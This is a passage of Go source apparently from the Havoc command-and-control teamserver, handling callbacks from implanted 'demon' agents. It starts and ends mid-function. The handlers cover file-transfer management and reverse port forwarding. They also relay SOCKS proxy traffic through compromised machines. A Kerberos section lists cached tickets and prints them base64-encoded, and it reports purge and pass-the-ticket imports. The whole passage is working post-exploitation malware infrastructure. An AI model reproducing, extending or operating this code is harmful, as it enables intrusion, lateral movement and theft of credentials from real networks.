						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x2 (resume). Expected at least 8 bytes but received %v bytes", Parser.Length()),
					}
				}
				a.RequestCompleted(RequestID)
				break

			case DEMON_COMMAND_TRANSFER_REMOVE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						Found  = Parser.ParseInt32()
						FileID = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_REMOVE, Found: %d, FileID: %x", AgentID, Found, FileID))

					if Found == win32.TRUE {
						if download := a.DownloadGet(FileID); download != nil {
							Message = map[string]string{
								"Type":    "Good",
								"Message": fmt.Sprintf("Successful found and removed download: %x", FileID),
							}
						} else {
							Message = map[string]string{
								"Type":    "Error",
								"Message": fmt.Sprintf("Couldn't remove download %x: Download does not exists", FileID),
							}
						}
					} else {
						Message = map[string]string{
							"Type":    "Error",
							"Message": fmt.Sprintf("Couldn't remove download %x: FileID not found", FileID),
						}
					}

				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_REMOVE, Invalid packet", AgentID))
					Message = map[string]string{
						"Type":    "Error",
						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x3 (remove). Expected at least 8 bytes but received %v bytes", Parser.Length()),
					}
				}
				a.RequestCompleted(RequestID)
				break

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - UNKNOWN (%d)", AgentID, SubCommand))

			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER, Invalid packet", AgentID))
		}

		break

	case COMMAND_SOCKET:
		var (
			SubCommand = 0
			Message    map[string]string
		)

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

			SubCommand = Parser.ParseInt32()

			switch SubCommand {
			case SOCKET_COMMAND_RPORTFWD_ADD:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {

					var (
						SocktID = 0
						Success = 0
						LclAddr = 0
						LclPort = 0
						FwdAddr = 0
						FwdPort = 0

						FwdString string
						LclString string
					)

					Success = Parser.ParseInt32()
					SocktID = Parser.ParseInt32()
					LclAddr = Parser.ParseInt32()
					LclPort = Parser.ParseInt32()
					FwdAddr = Parser.ParseInt32()
					FwdPort = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_ADD, Success: %d, SocktID: %x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, Success, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))

					LclString = common.Int32ToIpString(int64(LclAddr))
					FwdString = common.Int32ToIpString(int64(FwdAddr))

					if Success == win32.TRUE {
						a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("Started reverse port forward on %s:%d to %s:%d [Id: %x]", LclString, LclPort, FwdString, FwdPort, SocktID), "")
						return
					} else {
						a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to start reverse port forward on %s:%d to %s:%d", LclString, LclPort, FwdString, FwdPort), "")
						return
					}

				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_ADD, Invalid packet", AgentID))
					Message = map[string]string{
						"Type":    "Error",
						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_ADD : 0x0) expected at least 16 bytes but received %v bytes", Parser.Length()),
					}
				}

				break

			case SOCKET_COMMAND_RPORTFWD_LIST:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_LIST", AgentID))

				var (
					FwdList  string
					FwdCount int
				)

				FwdList += "\n"
				FwdList += fmt.Sprintf(" %-12s %s\n", "Socket ID", "Forward")
				FwdList += fmt.Sprintf(" %-12s %s\n", "---------", "-------")

				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					var (
						SocktID = 0
						LclAddr = 0
						LclPort = 0
						FwdAddr = 0
						FwdPort = 0

						FwdString string
						LclString string
					)

					SocktID = Parser.ParseInt32()
					LclAddr = Parser.ParseInt32()
					LclPort = Parser.ParseInt32()
					FwdAddr = Parser.ParseInt32()
					FwdPort = Parser.ParseInt32()

					LclString = common.Int32ToIpString(int64(LclAddr))
					FwdString = common.Int32ToIpString(int64(FwdAddr))

					FwdList += fmt.Sprintf(" %-12x %s\n", SocktID, fmt.Sprintf("%s:%d -> %s:%d", LclString, LclPort, FwdString, FwdPort))
					FwdCount++
				}

				a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("reverse port forwards [%d active]:", FwdCount), FwdList)
				a.RequestCompleted(RequestID)
				break

			case SOCKET_COMMAND_RPORTFWD_REMOVE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {

					var (
						SocktID = 0
						Type    = 0
						LclAddr = 0
						LclPort = 0
						FwdAddr = 0
						FwdPort = 0

						FwdString string
						LclString string
					)

					SocktID = Parser.ParseInt32()
					Type    = Parser.ParseInt32()
					LclAddr = Parser.ParseInt32()
					LclPort = Parser.ParseInt32()
					FwdAddr = Parser.ParseInt32()
					FwdPort = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_REMOVE, Type: %d, SocktID: %x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, Type, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))

					LclString = common.Int32ToIpString(int64(LclAddr))
					FwdString = common.Int32ToIpString(int64(FwdAddr))

					if Type == SOCKET_TYPE_REVERSE_PORTFWD {
						Message = map[string]string{
							"Type":    "Info",
							"Message": fmt.Sprintf("Successful closed and removed rportfwd [SocketID: %x] [Forward: %s:%d -> %s:%d]", SocktID, LclString, LclPort, FwdString, FwdPort),
						}
					}

					/* finally close our port forwarder */
					a.PortFwdClose(SocktID)

				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_REMOVE, Invalid packet", AgentID))
					Message = map[string]string{
						"Type":    "Info",
						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_REMOVE : 0x4) expected at least 20 bytes but received %v bytes", Parser.Length()),
					}
				}
				a.RequestCompleted(RequestID)
				break

			case SOCKET_COMMAND_RPORTFWD_CLEAR:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

					var Success = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_CLEAR, Success: %d", AgentID, Success))

					if Success == win32.TRUE {
						Message = map[string]string{
							"Type":    "Good",
							"Message": "Successful closed and removed all rportfwds",
						}
					} else {
						Message = map[string]string{
							"Type":    "Erro",
							"Message": "Failed to closed and remove all rportfwds",
						}
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_CLEAR, Invalid packet", AgentID))
					Message = map[string]string{
						"Type":    "Info",
						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_CLEAR : 0x3) expected at least 4 bytes but received %v bytes", Parser.Length()),
					}
				}
				a.RequestCompleted(RequestID)
				break

			case SOCKET_COMMAND_SOCKSPROXY_ADD:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_SOCKSPROXY_ADD", AgentID))
				break

			case SOCKET_COMMAND_OPEN:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {

					var (
						SocktID = 0
						LclAddr = 0
						LclPort = 0
						FwdAddr = 0
						FwdPort = 0

						FwdString string
					)

					SocktID = Parser.ParseInt32()
					LclAddr = Parser.ParseInt32()
					LclPort = Parser.ParseInt32()
					FwdAddr = Parser.ParseInt32()
					FwdPort = Parser.ParseInt32()

					// avoid too much spam
					//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_OPEN, SocktID: %08x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))

					FwdString = common.Int32ToIpString(int64(FwdAddr))
					FwdString = fmt.Sprintf("%s:%d", FwdString, FwdPort)

					if Socket := a.PortFwdGet(SocktID); Socket != nil {
						/* Socket already exists. don't do anything. */
						logger.Debug("Socket already exists")
						return
					}

					/* add this rportfwd */
					a.PortFwdNew(SocktID, LclAddr, LclPort, FwdAddr, FwdPort, FwdString)

					/* we will open the rportfwd client only after we have something to write */

				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_OPEN, Invalid packet", AgentID))
				}

				break

			case SOCKET_COMMAND_READ:
				/* if we receive the SOCKET_COMMAND_READ command
				 * that means that we should read the callback and send it to the forwared host/socks proxy */

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					var (
						SocktID = Parser.ParseInt32()
						Type    = Parser.ParseInt32()
						Success = Parser.ParseInt32()
					)

					if Success == win32.TRUE {
						if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
							var(
								Data = Parser.ParseBytes()
							)
							// avoid too much spam
							//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, SocktID: %08x, Type: %d, DataLength: %x", AgentID, SocktID, Type, len(Data)))

							if Type == SOCKET_TYPE_CLIENT {

								/* we only open rportfwd clients once we have data to write */
								opened, err := a.PortFwdIsOpen(SocktID)
								if err != nil {
									a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to reverse port forward host: %v", err), "")
									return
								}

								/* if first time, open the client */
								if opened == false {
									err := a.PortFwdOpen(SocktID)
									if err != nil {
										logger.Debug(fmt.Sprintf("Failed to open rportfwd: %v", err))	
									a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to open reverse port forward host: %v", err), "")
										return
									}
								}

								/* write the data to the forwarded host */
								err = a.PortFwdWrite(SocktID, Data)
								if err != nil {
									a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to reverse port forward socket 0x%08x: %v", SocktID, err), "")
									return
								}

								if opened == false {
									/* after we managed to open a socket to the forwarded host lets start a
									 * goroutine where we read the data from the forwarded host and send it to the agent. */
									go func() {

										for {

											Data, err := a.PortFwdRead(SocktID)
											if err == nil {

												/* only send the data if there is something... */
												if len(Data) > 0 {

													/* make a new job */
													var job = Job{
														Command: COMMAND_SOCKET,
														Data: []any{
															SOCKET_COMMAND_WRITE,
															SocktID,
															Data,
														},
													}

													/* append the job to the task queue */
													a.AddJobToQueue(job)

												}

											} else {
												/* we failed to read from the portfwd */
												logger.Error(fmt.Sprintf("Failed to read from socket %08x: %v", SocktID, err))
												return
											}
										}

									}()
								}

							} else if Type == SOCKET_TYPE_REVERSE_PROXY {

								/* check if there is a socket with that socks proxy id */
								if Socket := a.SocksClientGet(SocktID); Socket != nil {

									/* write the data to socks proxy */
									_, err := Socket.Conn.Write(Data)
									if err != nil {
										a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks proxy %v: %v", SocktID, err), "")

										/* TODO: remove socks proxy client */
										//a.SocksClientClose(SOCKET_TYPE_CLIENT)

										return
									}

								} else {
									logger.Error(fmt.Sprintf("SocketID not found: %08x\n", SocktID))
								}
							}
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, Invalid packet", AgentID))
						}
					} else {
						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
							var (
								ErrorCode = Parser.ParseInt32()
							)
							logger.Warn(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, SocktID: %08x, Type: %d, Failed with: %d", AgentID, SocktID, Type, ErrorCode))
							a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to read from socks target %v: %v", SocktID, ErrorCode), "")
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, Invalid packet", AgentID))
						}
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, Invalid packet", AgentID))
				}

				break

			case SOCKET_COMMAND_WRITE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					var (
						Id      = Parser.ParseInt32()
						Type    = Parser.ParseInt32()
						Success = Parser.ParseInt32()
					)

					if Success == win32.FALSE {
						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
							var (
								ErrorCode = Parser.ParseInt32()
							)
							logger.Warn(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_WRITE, Id: %08x, Type: %d, Failed with: %d", AgentID, Id, Type, ErrorCode))
							a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks target %v: %v", Id, ErrorCode), "")
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_WRITE, Invalid packet", AgentID))
						}
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_WRITE, Invalid packet", AgentID))
				}

				break

			case SOCKET_COMMAND_CLOSE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						SockId = Parser.ParseInt32()
						Type   = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CLOSE,   Id: %08x, Type: %d", AgentID, SockId, Type))

					if Type == SOCKET_TYPE_REVERSE_PROXY {

						/* lets remove it */
						if a.SocksClientClose(int32(SockId)) == false {
							logger.Error(fmt.Sprintf("SockId not found: %08x", SockId))
						}

					} else {
						logger.Error(fmt.Sprintf("Invalid socket type: %d", Type))
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CLOSE, Invalid packet", AgentID))
				}

				break

			case SOCKET_COMMAND_CONNECT:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {

					var (
						Success   = Parser.ParseInt32()
						SocketId  = Parser.ParseInt32()
						ErrorCode = Parser.ParseInt32()
					)

					if Client := a.SocksClientGet(SocketId); Client != nil {

						if Success == win32.TRUE {
							// succeeded

							// avoid too much spam
							//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Id: %08x, Type: %d, Success: %d", AgentID, SocketId, SOCKET_TYPE_REVERSE_PROXY, Success))

							err := socks.SendConnectSuccess(Client.Conn, Client.ATYP, Client.IpDomain, Client.Port)
							if err == nil {
								Client.Connected = true
							}

						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Id: %08x, Type: %d, Success: %d, ErrorCode: %d", AgentID, SocketId, SOCKET_TYPE_REVERSE_PROXY, Success, ErrorCode))

							socks.SendConnectFailure(Client.Conn, uint32(ErrorCode), Client.ATYP, Client.IpDomain, Client.Port)

							a.SocksClientClose(int32(SocketId))
						}

					} else {
						logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Socket id not found: %x", AgentID, SocketId))
					}

				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Invalid packet", AgentID))
				}

				break

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - UNKNOWN (%d)", AgentID, SubCommand))
			}

		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET, Invalid packet", AgentID))
			Message = map[string]string{
				"Type":    "Error",
				"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET expected at least 4 bytes but received %v bytes", Parser.Length()),
			}
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_KERBEROS:

		var (
			SubCommand int
			Message    map[string]string
			HighPart   int
			LowPart    int
			Success    int
		)

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

			SubCommand = Parser.ParseInt32()

			switch SubCommand {

			case KERBEROS_COMMAND_LUID:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

					Success = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - KERBEROS_COMMAND_LUID, Success: %d", AgentID, Success))

					if Success == win32.TRUE {

						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {

							HighPart = Parser.ParseInt32()
							LowPart = Parser.ParseInt32()

							Message = map[string]string{
								"Type":    "Good",
								"Message": fmt.Sprintf("Current LogonId: %x:0x%x", HighPart, LowPart),
							}
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_LUID, Invalid packet", AgentID))
						}

					} else {
						Message = map[string]string{
							"Type":    "Erro",
							"Message": "Failed to obtain the current logon ID",
						}
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_LUID, Invalid packet", AgentID))
				}

			case KERBEROS_COMMAND_KLIST:

				var (
					NumSessions           int
					NumTickets            int
					Output                string
					UserName              string
					Domain                string
					LogonIdLow            int
					LogonIdHigh           int
					Session               int
					UserSID               string
					LogonTimeLow          int
					LogonTimeHigh         int
					LogonTime             int64
					LogonType             int
					AuthenticationPackage string
					LogonServer           string
					LogonServerDNSDomain  string
					Upn                   string
					ClientName            string
					ClientRealm           string
					ServerName            string
					ServerRealm           string
					StartTime             int64
					StartTimeLow          int
					StartTimeHigh         int
					EndTime               int64
					EndTimeLow            int
					EndTimeHigh           int
					RenewTime             int64
					RenewTimeLow          int
					RenewTimeHigh         int
					EncryptionType        int
					TicketFlags           int
					TicketFlagsStr        string
					Ticket                []byte
				)

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

					Success = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - KERBEROS_COMMAND_KLIST, Success: %d", AgentID, Success))

					if Success == win32.TRUE {

						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

							NumSessions = Parser.ParseInt32()

							for NumSessions > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes}) {

								UserName = Parser.ParseUTF16String()
								Domain = Parser.ParseUTF16String()
								LogonIdLow = Parser.ParseInt32()
								LogonIdHigh = Parser.ParseInt32()
								Session = Parser.ParseInt32()
								UserSID = Parser.ParseUTF16String()
								LogonTimeLow = Parser.ParseInt32()
								LogonTimeHigh = Parser.ParseInt32()
								LogonType = Parser.ParseInt32()
								AuthenticationPackage = Parser.ParseUTF16String()
								LogonServer = Parser.ParseUTF16String()
								LogonServerDNSDomain = Parser.ParseUTF16String()
								Upn = Parser.ParseUTF16String()

								LogonTypes := map[int]string{
									win32.LOGON32_LOGON_INTERACTIVE:       "Interactive",
									win32.LOGON32_LOGON_NETWORK:           "Network",
									win32.LOGON32_LOGON_BATCH:             "Batch",
									win32.LOGON32_LOGON_SERVICE:           "Service",
									win32.LOGON32_LOGON_UNLOCK:            "Unlock",
									win32.LOGON32_LOGON_NETWORK_CLEARTEXT: "Network_Cleartext",
									win32.LOGON32_LOGON_NEW_CREDENTIALS:   "New_Credentials",
								}

								// go from FILETIME to SYSTEMTIME
								LogonTime = int64((((LogonTimeHigh << (4 * 8)) | LogonTimeLow) - 0x019DB1DED53E8000) / 10000000)

								Output += fmt.Sprintf("UserName                : %s\n", UserName)
								Output += fmt.Sprintf("Domain                  : %s\n", Domain)
								Output += fmt.Sprintf("LogonId                 : %x:0x%x\n", LogonIdHigh, LogonIdLow)
								Output += fmt.Sprintf("Session                 : %d\n", Session)
								Output += fmt.Sprintf("UserSID                 : %s\n", UserSID)
								Output += fmt.Sprintf("LogonTime               : %s\n", time.Unix(LogonTime, 0))
								Output += fmt.Sprintf("Authentication package  : %s\n", AuthenticationPackage)
								Output += fmt.Sprintf("LogonType               : %s\n", LogonTypes[LogonType])
								Output += fmt.Sprintf("LogonServer             : %s\n", LogonServer)
								Output += fmt.Sprintf("LogonServerDNSDomain    : %s\n", LogonServerDNSDomain)
								Output += fmt.Sprintf("UserPrincipalName       : %s\n", Upn)

								if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

									NumTickets = Parser.ParseInt32()
									Output += fmt.Sprintf("Cached tickets:         : %d\n", NumTickets)

									for NumTickets > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes}) {

										ClientName = Parser.ParseUTF16String()
										ClientRealm = Parser.ParseUTF16String()
										ServerName = Parser.ParseUTF16String()
										ServerRealm = Parser.ParseUTF16String()
										StartTimeLow = Parser.ParseInt32()
										StartTimeHigh = Parser.ParseInt32()
										EndTimeLow = Parser.ParseInt32()
										EndTimeHigh = Parser.ParseInt32()
										RenewTimeLow = Parser.ParseInt32()
										RenewTimeHigh = Parser.ParseInt32()
										EncryptionType = Parser.ParseInt32()
										TicketFlags = Parser.ParseInt32()
										Ticket = Parser.ParseBytes()

										// go from FILETIME to SYSTEMTIME
										StartTime = int64((((StartTimeHigh << (4 * 8)) | StartTimeLow) - 0x019DB1DED53E8000) / 10000000)
										EndTime = int64((((EndTimeHigh << (4 * 8)) | EndTimeLow) - 0x019DB1DED53E8000) / 10000000)
										RenewTime = int64((((RenewTimeHigh << (4 * 8)) | RenewTimeLow) - 0x019DB1DED53E8000) / 10000000)

										EncryptionTypes := map[int]string{
											win32.DES_CBC_CRC:                  "DES_CBC_CRC",
											win32.DES_CBC_MD4:                  "DES_CBC_MD4",
											win32.DES_CBC_MD5:                  "DES_CBC_MD5",
											win32.DES3_CBC_MD5:                 "DES3_CBC_MD5",
											win32.DES3_CBC_SHA1:                "DES3_CBC_SHA1",
											win32.DSAWITHSHA1_CMSOID:           "DSAWITHSHA1_CMSOID",
											win32.MD5WITHRSAENCRYPTION_CMSOID:  "MD5WITHRSAENCRYPTION_CMSOID",
											win32.SHA1WITHRSAENCRYPTION_CMSOID: "SHA1WITHRSAENCRYPTION_CMSOID",
											win32.RC2CBC_ENVOID:                "RC2CBC_ENVOID",
											win32.RSAENCRYPTION_ENVOID:         "RSAENCRYPTION_ENVOID",
											win32.RSAES_OAEP_ENV_OID:           "RSAES_OAEP_ENV_OID",
											win32.DES3_CBC_SHA1_KD:             "DES3_CBC_SHA1_KD",
											win32.AES128_CTS_HMAC_SHA1:         "AES128_CTS_HMAC_SHA1",
											win32.AES256_CTS_HMAC_SHA1:         "AES256_CTS_HMAC_SHA1",
											win32.RC4_HMAC:                     "RC4_HMAC",
											win32.RC4_HMAC_EXP:                 "RC4_HMAC_EXP",
											win32.SUBKEY_KEYMATERIAL:           "SUBKEY_KEYMATERIAL",
											win32.OLD_EXP:                      "OLD_EXP",
										}

										TicketFlagTypes := []string{
											"name_canonicalize",
											"anonymous",
											"ok_as_delegate",
											"?",
											"hw_authent",
											"pre_authent",
											"initial",
											"renewable",
											"invalid",
											"postdated",
											"may_postdate",
											"proxy",
											"proxiable",
											"forwarded",
											"forwardable",
											"reserved",
										}

										TicketFlagsStr = ""

										for i := 0; i < 16; i++ {
											if ((TicketFlags >> (i + 16)) & 1) == 1 {
												TicketFlagsStr += " " + TicketFlagTypes[i]
											}
										}

										TicketFlagsStr += fmt.Sprintf(" (0x%x)", TicketFlags)

										Output += "\n"
										Output += fmt.Sprintf("\tClient name     : %s @ %s\n", ClientName, ClientRealm)
										Output += fmt.Sprintf("\tServer name     : %s @ %s\n", ServerName, ServerRealm)
										Output += fmt.Sprintf("\tStart time      : %s\n", time.Unix(StartTime, 0))
										Output += fmt.Sprintf("\tEnd time        : %s\n", time.Unix(EndTime, 0))
										Output += fmt.Sprintf("\tRewnew time     : %s\n", time.Unix(RenewTime, 0))
										Output += fmt.Sprintf("\tEncryption type : %s\n", EncryptionTypes[EncryptionType])
										Output += fmt.Sprintf("\tFlags           :%s\n", TicketFlagsStr)
										if len(Ticket) > 0 {
											Output += fmt.Sprintf("\tTicket          : %s\n", base64.StdEncoding.EncodeToString(Ticket))
										}

										NumTickets -= 1
									}
								} else {
									logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_KLIST, Invalid packet", AgentID))
								}

								Output += "\n"

								NumSessions -= 1
							}

							Message = map[string]string{
								"Type":   "Info",
								"Output": Output,
							}
							a.RequestCompleted(RequestID)
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_KLIST, Invalid packet", AgentID))
						}

					} else {
						Message = map[string]string{
							"Type":    "Erro",
							"Message": "Failed to list all kerberos tickets",
						}
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_KLIST, Invalid packet", AgentID))
				}

				break

			case KERBEROS_COMMAND_PURGE:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

					Success = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - KERBEROS_COMMAND_PURGE, Success: %d", AgentID, Success))

					if Success == win32.TRUE {

						Message = map[string]string{
							"Type":    "Good",
							"Message": "Successfully purged the Kerberos ticket",
						}
					} else {
						Message = map[string]string{
							"Type":    "Erro",
							"Message": "Failed to purge the kerberos ticket",
						}
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_PURGE, Invalid packet", AgentID))
				}

			case KERBEROS_COMMAND_PTT:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {

					Success = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - KERBEROS_COMMAND_PTT, Success: %d", AgentID, Success))

					if Success == win32.TRUE {

						Message = map[string]string{
							"Type":    "Good",
							"Message": "Successfully imported the Kerberos ticket",
						}
					} else {
						Message = map[string]string{
							"Type":    "Erro",
							"Message": "Failed to import the kerberos ticket",
						}
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS  - KERBEROS_COMMAND_PTT, Invalid packet", AgentID))
				}

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS - UNKNOWN (%d)", AgentID, SubCommand))
			}
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KERBEROS, Invalid packet", AgentID))
		}

		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)

		break

	case COMMAND_MEM_FILE:
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
			var (
				MemFileID = Parser.ParseInt32()
				Success   = Parser.ParseInt32()
			)

			// TODO: don't ignore this packet?
			//       if this fails, then inline-execute, dotnet, or upload will show the error

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_MEM_FILE, Success: %d, MemFileID: %x", AgentID, Success, MemFileID))
			a.RequestCompleted(RequestID)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_MEM_FILE, Invalid packet", AgentID))
		}

		break;

	case COMMAND_PACKAGE_DROPPED:
		var (
			Message    map[string]string
		)
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
			var (
				PkgLength = Parser.ParseInt32()
				MaxLength = Parser.ParseInt32()
			)

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PACKAGE_DROPPED, PkgLength: 0x%x, MaxLength: 0x%x", AgentID, PkgLength, MaxLength))

			Message = map[string]string{
				"Type":    "Erro",
				"Message": "A package was discarded by demon for being larger than PIPE_BUFFER_MAX",
			}

			// a single command can generate multiple dropped packages
			//a.RequestCompleted(RequestID)
